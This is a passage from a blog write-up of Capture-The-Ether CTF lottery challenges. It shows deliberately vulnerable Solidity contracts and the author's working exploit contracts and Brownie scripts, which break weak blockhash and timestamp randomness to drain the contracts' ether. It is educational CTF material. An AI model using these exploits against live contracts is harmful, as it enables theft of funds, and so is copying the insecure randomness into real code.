<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> GuessTheRandomNumberChallenge, accounts, web3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    contract = GuessTheRandomNumberChallenge.deploy(</span><br><span class="line">        &#123;<span class="string">&#x27;from&#x27;</span>: deployer, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    contract.guess(web3.eth.get_storage_at(contract.address, <span class="number">0</span>),</span><br><span class="line">                   &#123;<span class="string">&#x27;from&#x27;</span>: player, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h2 id="Guess-the-new-number"><a href="#Guess-the-new-number" class="headerlink" title="Guess the new number"></a>Guess the new number</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">GuessTheNewNumberChallenge</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">GuessTheNewNumberChallenge</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">guess</span>(<span class="params">uint8 n</span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">        uint8 answer = <span class="title function_">uint8</span>(<span class="title function_">keccak256</span>(block.<span class="title function_">blockhash</span>(block.<span class="property">number</span> - <span class="number">1</span>), now));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (n == answer) &#123;</span><br><span class="line">            msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="number">2</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This contract calculates the random number in the same way as in the previous challenge, but this time this contract is not storing the number, however the blockhash and timestamp are public we can calculate the random number and call the contract at the same time so that the guess and the answer matches.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.7</span><span class="number">.3</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">GuessTheNewNumberChallenge</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) external view returns (bool);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">guess</span>(<span class="params">uint8 n</span>) external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Gtnn</span>_Exploit &#123;</span><br><span class="line">    <span class="title class_">GuessTheNewNumberChallenge</span> gtnn;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _address</span>) payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">        gtnn = <span class="title class_">GuessTheNewNumberChallenge</span>(_address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">exploit</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        uint8 ans = <span class="title function_">uint8</span>(</span><br><span class="line">            <span class="title function_">uint256</span>(</span><br><span class="line">                <span class="title function_">keccak256</span>(</span><br><span class="line">                    abi.<span class="title function_">encodePacked</span>(</span><br><span class="line">                        <span class="title function_">blockhash</span>(block.<span class="property">number</span> - <span class="number">1</span>),</span><br><span class="line">                        block.<span class="property">timestamp</span></span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        gtnn.<span class="property">guess</span>&#123;<span class="attr">value</span>: <span class="number">1</span> ether&#125;(ans);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">receive</span>() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> GuessTheNewNumberChallenge, Gtnn_Exploit, accounts, web3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    contract = GuessTheNewNumberChallenge.deploy(</span><br><span class="line">        &#123;<span class="string">&#x27;from&#x27;</span>: deployer, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line">    exploit = Gtnn_Exploit.deploy(</span><br><span class="line">        contract.address, &#123;<span class="string">&#x27;from&#x27;</span>: player, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    tx = exploit.exploit(&#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line">    <span class="built_in">print</span>(tx)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h2 id="Predict-the-future"><a href="#Predict-the-future" class="headerlink" title="Predict the future"></a>Predict the future</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">PredictTheFutureChallenge</span> &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    uint8 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">PredictTheFutureChallenge</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">lockInGuess</span>(<span class="params">uint8 n</span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(guesser == <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line"></span><br><span class="line">        guesser = msg.<span class="property">sender</span>;</span><br><span class="line">        guess = n;</span><br><span class="line">        settlementBlockNumber = block.<span class="property">number</span> + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">settle</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == guesser);</span><br><span class="line">        <span class="built_in">require</span>(block.<span class="property">number</span> &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        uint8 answer = <span class="title function_">uint8</span>(</span><br><span class="line">            <span class="title function_">keccak256</span>(block.<span class="title function_">blockhash</span>(block.<span class="property">number</span> - <span class="number">1</span>), now)</span><br><span class="line">        ) % <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">        guesser = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (guess == answer) &#123;</span><br><span class="line">            msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="number">2</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>In this challenge we need to lock a guess using <code>lockInGuess()</code> function, and use the <code>settle()</code> function to evaluvate the guess, this time the range is narrowed down to only <strong>10</strong> numbers, so I just passed <code>0x05</code> to the <code>lockInGuess()</code> function and waited for the block which gives 5 when the random number is calculated inside the contract and then called <code>settle()</code> function to complete the challenge.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">PredictTheFutureChallenge</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) external view returns (bool);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">lockInGuess</span>(<span class="params">uint8 n</span>) external payable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">settle</span>(<span class="params"></span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Ptf</span>_Exploit &#123;</span><br><span class="line">    <span class="title class_">PredictTheFutureChallenge</span> ptf;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _address</span>) payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">        ptf = <span class="title class_">PredictTheFutureChallenge</span>(_address);</span><br><span class="line">        ptf.<span class="property">lockInGuess</span>.<span class="title function_">value</span>(<span class="number">1</span> ether)(<span class="number">0x05</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">exploit</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        uint8 ans = <span class="title function_">uint8</span>(<span class="title function_">keccak256</span>(block.<span class="title function_">blockhash</span>(block.<span class="property">number</span> - <span class="number">1</span>), now)) %</span><br><span class="line">            <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">if</span> (ans == <span class="title function_">uint8</span>(<span class="number">0x05</span>)) &#123;</span><br><span class="line">            ptf.<span class="title function_">settle</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span>(<span class="params"></span>) external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> PredictTheFutureChallenge, Ptf_Exploit, accounts, chain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    contract = PredictTheFutureChallenge.deploy(</span><br><span class="line">        &#123;<span class="string">&#x27;from&#x27;</span>: deployer, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line">    exploit = Ptf_Exploit.deploy(</span><br><span class="line">        contract.address, &#123;<span class="string">&#x27;from&#x27;</span>: player, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> contract.isComplete():</span><br><span class="line">        exploit.exploit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h2 id="Predict-the-block-hash"><a href="#Predict-the-block-hash" class="headerlink" title="Predict the block hash"></a>Predict the block hash</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">PredictTheBlockHashChallenge</span> &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    bytes32 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">PredictTheBlockHashChallenge</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">lockInGuess</span>(<span class="params">bytes32 hash</span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(guesser == <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line"></span><br><span class="line">        guesser = msg.<span class="property">sender</span>;</span><br><span class="line">        guess = hash;</span><br><span class="line">        settlementBlockNumber = block.<span class="property">number</span> + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">settle</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == guesser);</span><br><span class="line">        <span class="built_in">require</span>(block.<span class="property">number</span> &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        bytes32 answer = block.<span class="title function_">blockhash</span>(settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        guesser = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (guess == answer) &#123;</span><br><span class="line">            msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="number">2</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This challenge is very similar to the previous challenge, but this challenge uses only <code>block.blockhash()</code> function to generate the random number. since <code>block.blockhash()</code> gives only blockhashes of last <code>256</code> blocks if we wait for <code>256</code> blocks the function returns <code>0</code> which results the answer to be <code>0</code> so we can pass <code>0</code> to the <code>lockInGuess()</code> function and wait for 256 blocks to complete and then call the <code>settle()</code> function to solve this challenge.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> PredictTheBlockHashChallenge, accounts, chain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    contract = PredictTheBlockHashChallenge.deploy(</span><br><span class="line">        &#123;<span class="string">&#x27;from&#x27;</span>: deployer, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    contract.lockInGuess(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">32</span>, &#123;<span class="string">&#x27;from&#x27;</span>: player, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line">    chain.mine(<span class="number">257</span>)</span><br><span class="line">    contract.settle(&#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<hr>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">tags</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Warmup"><span class="toc-number">1.</span> <span class="toc-text">Warmup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Deploy-a-contract"><span class="toc-number"></span> <span class="toc-text">Deploy a contract</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Call-me"><span class="toc-number"></span> <span class="toc-text">Call me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Choose-a-nickname"><span class="toc-number"></span> <span class="toc-text">Choose a nickname</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Lotteries"><span class="toc-number">1.</span> <span class="toc-text">Lotteries</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Guess-the-number"><span class="toc-number"></span> <span class="toc-text">Guess the number</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Guess-the-secret-number"><span class="toc-number"></span> <span class="toc-text">Guess the secret number</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Guess-the-random-number"><span class="toc-number"></span> <span class="toc-text">Guess the random number</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Guess-the-new-number"><span class="toc-number"></span> <span class="toc-text">Guess the new number</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Predict-the-future"><span class="toc-number"></span> <span class="toc-text">Predict the future</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Predict-the-block-hash"><span class="toc-number"></span> <span class="toc-text">Predict the block hash</span></a>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/12/01/Capture-The-Ether-CTF-Warmup-Lotteries/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/12/01/Capture-The-Ether-CTF-Warmup-Lotteries/&text=Capture-The-Ether CTF - Warmup &amp; Lotteries"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/12/01/Capture-The-Ether-CTF-Warmup-Lotteries/&title=Capture-The-Ether CTF - Warmup &amp; Lotteries"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/12/01/Capture-The-Ether-CTF-Warmup-Lotteries/&is_video=false&description=Capture-The-Ether CTF - Warmup &amp; Lotteries"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Capture-The-Ether CTF - Warmup &amp; Lotteries&body=Check out this article: http://example.com/2022/12/01/Capture-The-Ether-CTF-Warmup-Lotteries/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/12/01/Capture-The-Ether-CTF-Warmup-Lotteries/&title=Capture-The-Ether CTF - Warmup &amp; Lotteries"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/12/01/Capture-The-Ether-CTF-Warmup-Lotteries/&title=Capture-The-Ether CTF - Warmup &amp; Lotteries"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/12/01/Capture-The-Ether-CTF-Warmup-Lotteries/&title=Capture-The-Ether CTF - Warmup &amp; Lotteries"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/12/01/Capture-The-Ether-CTF-Warmup-Lotteries/&title=Capture-The-Ether CTF - Warmup &amp; Lotteries"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/12/01/Capture-The-Ether-CTF-Warmup-Lotteries/&name=Capture-The-Ether CTF - Warmup &amp; Lotteries&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/12/01/Capture-The-Ether-CTF-Warmup-Lotteries/&t=Capture-The-Ether CTF - Warmup &amp; Lotteries"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2019-2022
    Chandu Kona
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

    <script async src="https://www.googletagmanager.com/gtag/js?id=G-4V3049N925"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-4V3049N925');
    </script>

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
